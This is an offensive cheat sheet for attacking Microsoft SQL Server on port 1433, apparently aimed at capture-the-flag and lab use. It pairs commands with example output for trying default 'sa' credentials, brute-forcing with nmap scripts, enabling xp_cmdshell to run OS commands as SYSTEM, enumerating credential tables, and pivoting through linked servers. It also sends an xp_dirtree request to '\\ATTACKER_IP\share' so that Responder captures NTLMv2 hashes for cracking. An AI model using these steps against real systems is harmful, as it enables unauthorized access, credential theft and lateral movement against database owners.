# MSSQL (1433)

### Try default creds

```bash
impacket-mssqlclient sa:password@$IP
```

> sa with blank/weak password

**Why:** Default SA account

<details>
<summary>Example Output</summary>

```
impacket-mssqlclient sa:sa@10.10.10.5
[*] Encryption required
[*] ENVCHANGE(DATABASE): Old: master, New: master
SQL> SELECT @@version;
Microsoft SQL Server 2019

Common: sa:sa, sa:password, sa:sa123
```
</details>

---

### Nmap MSSQL scripts

```bash
nmap --script ms-sql-* -p 1433 $IP
```

> Info, brute, xp_cmdshell

**Why:** Quick overview

<details>
<summary>Example Output</summary>

```
nmap --script ms-sql-* -p 1433 10.10.10.5
| ms-sql-info:
|   Version: 14.0.1000.169 (SQL Server 2017)
|   Instance: MSSQLSERVER
| ms-sql-brute:
|   sa:sa = Success
```
</details>

---

### Enable xp_cmdshell

```bash
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

> After login as sa

**Why:** Enables OS command execution

<details>
<summary>Example Output</summary>

```
1> EXEC sp_configure 'show advanced options', 1;
2> RECONFIGURE;
3> EXEC sp_configure 'xp_cmdshell', 1;
4> RECONFIGURE;
5> EXEC xp_cmdshell 'whoami';
nt authority\system
```
</details>

---

### Execute commands

```bash
EXEC xp_cmdshell 'whoami';
```

> Run system commands

**Why:** RCE via database

<details>
<summary>Example Output</summary>

```
EXEC xp_cmdshell 'whoami';
nt authority\system

EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt';
flag{sql_rce_ftw}
(Full command execution as SYSTEM)
```
</details>

---

### Enum databases

```bash
SELECT name FROM master.sys.databases;
```

> List all databases

**Why:** Find interesting data

<details>
<summary>Example Output</summary>

```
SQL> SELECT name FROM sys.databases;
master
tempdb
model
msdb
webapp
HRDatabase

SQL> USE HRDatabase;
SQL> SELECT name FROM sysobjects WHERE xtype='U';
employees
credentials
salaries
```
</details>

---

### Linked servers

```bash
SELECT * FROM openquery("linkedserver", 'SELECT 1');
```

> Pivot to other servers

**Why:** Lateral movement via DB links

<details>
<summary>Example Output</summary>

```
SELECT * FROM sys.servers;
srv_name: DBPROD01
srv_name: HRDB

EXEC ('xp_cmdshell ''whoami''') AT [DBPROD01];
corp\dbadmin
(Lateral movement through linked SQL servers)
```
</details>

---

### Capture hash (responder)

```bash
EXEC xp_dirtree '\\ATTACKER_IP\share';
```

> Trigger SMB auth to your machine

**Why:** Capture NTLMv2 hash

<details>
<summary>Example Output</summary>

```
On attacker: responder -I tun0

On MSSQL: EXEC xp_dirtree '\\10.10.14.2\share';

Responder captures:
[SMB] NTLMv2 Hash: sa::CORP:abc123...
(Crack with hashcat -m 5600)
```
</details>

---
